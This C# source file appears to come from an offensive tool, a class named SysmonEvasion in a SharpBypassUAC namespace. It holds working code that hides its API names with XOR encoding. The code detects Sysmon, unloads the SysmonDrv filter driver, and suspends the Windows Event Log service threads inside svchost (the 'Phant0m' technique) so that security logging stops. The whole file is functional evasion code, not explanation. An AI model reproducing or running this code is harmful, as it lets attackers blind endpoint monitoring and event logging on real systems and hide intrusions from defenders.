using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    public class SysmonEvasion
    {
        // XOR keys per DLL group
        private static readonly byte _xkK = 0x2D; // kernel32
        private static readonly byte _xkN = 0x37; // ntdll
        private static readonly byte _xkF = 0x4B; // fltlib

        // ── fltlib group (key 0x4B) ────────────────────────────────

        // "fltlib.dll"
        private static readonly byte[] _s0 = {
            0x2D, 0x27, 0x3F, 0x27, 0x22, 0x29, 0x65, 0x2F, 0x27, 0x27
        };
        // "FilterUnload"
        private static readonly byte[] _s1 = {
            0x0D, 0x22, 0x27, 0x3F, 0x2E, 0x39, 0x1E, 0x25, 0x27, 0x24, 0x2A, 0x2F
        };
        // "SysmonDrv"
        private static readonly byte[] _s2 = {
            0x18, 0x32, 0x38, 0x26, 0x24, 0x25, 0x0F, 0x39, 0x3D
        };

        // ── kernel32 group (key 0x2D) ──────────────────────────────

        // "CreateToolhelp32Snapshot"
        private static readonly byte[] _s3 = {
            0x6E, 0x5F, 0x48, 0x4C, 0x59, 0x48, 0x79, 0x42, 0x42,
            0x41, 0x45, 0x48, 0x41, 0x5D, 0x1E, 0x1F, 0x7E, 0x43,
            0x4C, 0x5D, 0x5E, 0x45, 0x42, 0x59
        };
        // "Thread32First"
        private static readonly byte[] _s4 = {
            0x79, 0x45, 0x5F, 0x48, 0x4C, 0x49, 0x1E, 0x1F, 0x6B,
            0x44, 0x5F, 0x5E, 0x59
        };
        // "Thread32Next"
        private static readonly byte[] _s5 = {
            0x79, 0x45, 0x5F, 0x48, 0x4C, 0x49, 0x1E, 0x1F, 0x63,
            0x48, 0x55, 0x59
        };
        // "OpenThread"
        private static readonly byte[] _s6 = {
            0x62, 0x5D, 0x48, 0x43, 0x79, 0x45, 0x5F, 0x48, 0x4C, 0x49
        };
        // "SuspendThread"
        private static readonly byte[] _s7 = {
            0x7E, 0x58, 0x5E, 0x5D, 0x48, 0x43, 0x49, 0x79, 0x45,
            0x5F, 0x48, 0x4C, 0x49
        };
        // "CloseHandle"
        private static readonly byte[] _s8 = {
            0x6E, 0x41, 0x42, 0x5E, 0x48, 0x65, 0x4C, 0x43, 0x49,
            0x41, 0x48
        };
        // "Sysmon64"
        private static readonly byte[] _s9 = {
            0x7E, 0x54, 0x5E, 0x40, 0x42, 0x43, 0x1B, 0x19
        };
        // "Sysmon"
        private static readonly byte[] _sA = {
            0x7E, 0x54, 0x5E, 0x40, 0x42, 0x43
        };

        // ── ntdll group (key 0x37) ─────────────────────────────────

        // "NtQueryInformationThread"
        private static readonly byte[] _sB = {
            0x79, 0x43, 0x66, 0x42, 0x52, 0x45, 0x4E, 0x7E, 0x59,
            0x51, 0x58, 0x45, 0x5A, 0x56, 0x43, 0x5E, 0x58, 0x59,
            0x63, 0x5F, 0x45, 0x52, 0x56, 0x53
        };
        // "wevtsvc.dll"
        private static readonly byte[] _sC = {
            0x40, 0x52, 0x41, 0x43, 0x44, 0x41, 0x54, 0x19, 0x53,
            0x5B, 0x5B
        };

        // ── Constants ──────────────────────────────────────────────

        private const uint TH32CS_SNAPTHREAD = 0x00000004;
        private const uint THREAD_SUSPEND_RESUME = 0x0002;
        private const uint THREAD_QUERY_INFORMATION = 0x0040;
        private const int ThreadQuerySetWin32StartAddress = 9;

        // ── Delegates ──────────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate int FilterUnloadDelegate(string filterName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate IntPtr CreateToolhelp32SnapshotDelegate(uint dwFlags, uint th32ProcessID);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool Thread32FirstDelegate(IntPtr hSnapshot, IntPtr lpte);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool Thread32NextDelegate(IntPtr hSnapshot, IntPtr lpte);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint SuspendThreadDelegate(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtQueryInformationThreadDelegate(IntPtr threadHandle, int threadInformationClass,
            IntPtr threadInformation, int threadInformationLength, IntPtr returnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool CloseHandleDelegate(IntPtr hObject);

        // ── R0: Detect Sysmon ──────────────────────────────────────

        public static bool R0()
        {
            try
            {
                string n64 = W.X(_s9, _xkK);
                string n32 = W.X(_sA, _xkK);

                var procs = Process.GetProcessesByName(n64);
                if (procs.Length > 0) return true;

                procs = Process.GetProcessesByName(n32);
                if (procs.Length > 0) return true;
            }
            catch { }
            return false;
        }

        // ── R1: Unload SysmonDrv ───────────────────────────────────

        public static bool R1()
        {
            try
            {
                string fltDll = W.X(_s0, _xkF);
                string apiName = W.X(_s1, _xkF);
                var filterUnload = W.G<FilterUnloadDelegate>(fltDll, apiName);

                string drvName = W.X(_s2, _xkF);
                int hr = filterUnload(drvName);
                return hr == 0;
            }
            catch { return false; }
        }

        // ── R2: Phant0m ────────────────────────────────────────────

        public static int R2()
        {
            int count = 0;

            try
            {
                int targetPid = 0;
                IntPtr modBase = IntPtr.Zero;
                int modSize = 0;
                string wevt = W.X(_sC, _xkN);

                foreach (var proc in Process.GetProcessesByName("svchost"))
                {
                    try
                    {
                        foreach (ProcessModule mod in proc.Modules)
                        {
                            if (mod.ModuleName.Equals(wevt,
                                StringComparison.OrdinalIgnoreCase))
                            {
                                targetPid = proc.Id;
                                modBase = mod.BaseAddress;
                                modSize = mod.ModuleMemorySize;
                                break;
                            }
                        }
                        if (targetPid != 0) break;
                    }
                    catch { }
                }

                if (targetPid == 0 || modBase == IntPtr.Zero)
                    return 0;

                long lo = modBase.ToInt64();
                long hi = lo + modSize;

                string k32 = W.X(new byte[] {
                    0x46, 0x48, 0x5F, 0x43, 0x48, 0x41, 0x1E, 0x1F,
                    0x03, 0x49, 0x41, 0x41 }, _xkK);
                string ntdll = W.X(new byte[] {
                    0x59, 0x43, 0x53, 0x53, 0x59, 0x17, 0x53, 0x59,
                    0x59 }, _xkN);

                var cths = W.G<CreateToolhelp32SnapshotDelegate>(k32, W.X(_s3, _xkK));
                var t32f = W.G<Thread32FirstDelegate>(k32, W.X(_s4, _xkK));
                var t32n = W.G<Thread32NextDelegate>(k32, W.X(_s5, _xkK));
                var ot = W.G<OpenThreadDelegate>(k32, W.X(_s6, _xkK));
                var st = W.G<SuspendThreadDelegate>(k32, W.X(_s7, _xkK));
                var ch = W.G<CloseHandleDelegate>(k32, W.X(_s8, _xkK));
                var ntqit = W.G<NtQueryInformationThreadDelegate>(ntdll, W.X(_sB, _xkN));

                IntPtr hSnap = cths(TH32CS_SNAPTHREAD, 0);
                if (hSnap == IntPtr.Zero || hSnap == new IntPtr(-1))
                    return 0;

                // THREADENTRY32: 28 bytes
                IntPtr te = Marshal.AllocHGlobal(28);

                try
                {
                    Marshal.WriteInt32(te, 0, 28);

                    if (!t32f(hSnap, te))
                    {
                        ch(hSnap);
                        return 0;
                    }

                    do
                    {
                        int ownerPid = Marshal.ReadInt32(te, 12);
                        if (ownerPid != targetPid)
                            continue;

                        int tid = Marshal.ReadInt32(te, 8);

                        IntPtr hThread = ot(
                            THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME,
                            false, (uint)tid);
                        if (hThread == IntPtr.Zero)
                            continue;

                        IntPtr pAddr = Marshal.AllocHGlobal(IntPtr.Size);
                        try
                        {
                            Marshal.WriteIntPtr(pAddr, IntPtr.Zero);
                            int status = ntqit(hThread,
                                ThreadQuerySetWin32StartAddress,
                                pAddr, IntPtr.Size, IntPtr.Zero);

                            if (status == 0)
                            {
                                long startAddr = Marshal.ReadIntPtr(pAddr).ToInt64();

                                if (startAddr >= lo && startAddr < hi)
                                {
                                    st(hThread);
                                    count++;
                                }
                            }
                        }
                        finally
                        {
                            Marshal.FreeHGlobal(pAddr);
                        }

                        ch(hThread);

                    } while (t32n(hSnap, te));
                }
                finally
                {
                    Marshal.FreeHGlobal(te);
                    ch(hSnap);
                }
            }
            catch { }

            return count;
        }
    }
}
